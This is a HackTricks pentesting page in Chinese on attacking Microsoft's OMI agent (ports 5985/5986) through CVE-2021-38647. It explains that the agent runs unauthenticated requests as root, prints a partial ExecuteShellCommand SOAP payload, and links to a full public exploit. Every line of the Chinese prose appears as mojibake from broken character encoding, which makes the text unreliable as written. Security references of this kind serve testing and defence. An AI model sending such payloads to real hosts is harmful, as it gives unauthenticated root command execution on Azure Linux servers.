# 5985,5986 - OMIæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

OMIæ˜¯ç”±Microsoftå¼€å‘çš„å¼€æºè¿œç¨‹é…ç½®ç®¡ç†å·¥å…·ã€‚å½“ä½¿ç”¨ä»¥ä¸‹æœåŠ¡æ—¶ï¼Œé€šå¸¸ä¼šåœ¨Azure LinuxæœåŠ¡å™¨ä¸Šå®‰è£…OMIä»£ç†ï¼š

* Azureè‡ªåŠ¨åŒ–
* Azureè‡ªåŠ¨æ›´æ–°
* Azureè¿è¥ç®¡ç†å¥—ä»¶
* Azureæ—¥å¿—åˆ†æ
* Azureé…ç½®ç®¡ç†
* Azureè¯Šæ–­

å½“é…ç½®äº†è¿™äº›æœåŠ¡æ—¶ï¼Œomiengineè¿›ç¨‹å°†åœ¨æ‰€æœ‰æ¥å£ä¸Šç›‘å¬ï¼Œå¹¶ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œã€‚

<figure><img src="../.gitbook/assets/image (1) (3) (2).png" alt=""><figcaption></figcaption></figure>

**é»˜è®¤ç«¯å£ï¼š**5985ï¼ˆhttpï¼‰ï¼Œ5986ï¼ˆhttpsï¼‰

## [CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)

æˆªè‡³9æœˆ16æ—¥ï¼ŒAzureä¸­æ–°åˆ›å»ºçš„LinuxæœåŠ¡å™¨ä»ç„¶ä½¿ç”¨ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„OMIä»£ç†ç‰ˆæœ¬ã€‚åœ¨éƒ¨ç½²LinuxæœåŠ¡å™¨å¹¶å¯ç”¨ä¸Šè¿°æœåŠ¡ä¹‹åï¼ŒæœåŠ¡å™¨å°†å¤„äºæ˜“å—æ”»å‡»çš„çŠ¶æ€ã€‚

OMIæœåŠ¡å™¨é€šè¿‡/wsmanç«¯ç‚¹æ¥æ”¶é…ç½®ç®¡ç†æ¶ˆæ¯ã€‚é€šå¸¸ï¼Œä¼šä¼ é€’ä¸€ä¸ªèº«ä»½éªŒè¯å¤´å’Œæ¶ˆæ¯ï¼ŒOMIæœåŠ¡å™¨å°†ç¡®ä¿å®¢æˆ·ç«¯è¢«æˆæƒè¿›è¡Œé€šä¿¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¼æ´æ˜¯å½“æ²¡æœ‰èº«ä»½éªŒè¯å¤´æ—¶ï¼ŒæœåŠ¡å™¨é”™è¯¯åœ°æ¥å—æ¶ˆæ¯å¹¶ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ã€‚

é€šè¿‡å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ²¡æœ‰æŒ‡å®šèº«ä»½éªŒè¯å¤´çš„â€œExecuteShellCommandâ€SOAPè´Ÿè½½ï¼Œå®ƒå°†ä»¥rootèº«ä»½æ‰§è¡Œè¯¥å‘½ä»¤ã€‚
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
åœ¨[https://github.com/horizon3ai/CVE-2021-38647](https://github.com/horizon3ai/CVE-2021-38647)ä¸­æ‰¾åˆ°å®Œæ•´çš„æ¼æ´åˆ©ç”¨ã€‚

## å‚è€ƒèµ„æ–™

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ PDF æ ¼å¼çš„ HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
